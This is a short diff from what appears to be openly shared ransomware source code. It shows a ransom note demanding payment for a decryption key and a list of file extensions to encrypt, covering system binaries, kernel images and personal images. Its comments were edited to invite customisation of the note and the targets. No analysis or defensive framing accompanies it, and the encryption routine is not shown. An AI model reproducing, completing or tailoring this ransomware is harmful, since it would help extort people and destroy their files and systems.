@@ -21,11 +21,11 @@ ascii_art = """
                           (_((                
 """
 
-# Note to leave in each path
+# Note to leave in each path, edit this to fit your needs
 note = "Whoops! We're so sorry! Your files have been encrypted. And the only way to decrypt" \
        " them is with the key. If you want the key, you must send us moneyz"
 
-# Array of target extensions that we want to encrypt
+# Array of target extensions that we want to encrypt. Might want to comment out the first row.
 target_extensions = [
     'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # System files. May destroy system
     'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # Images
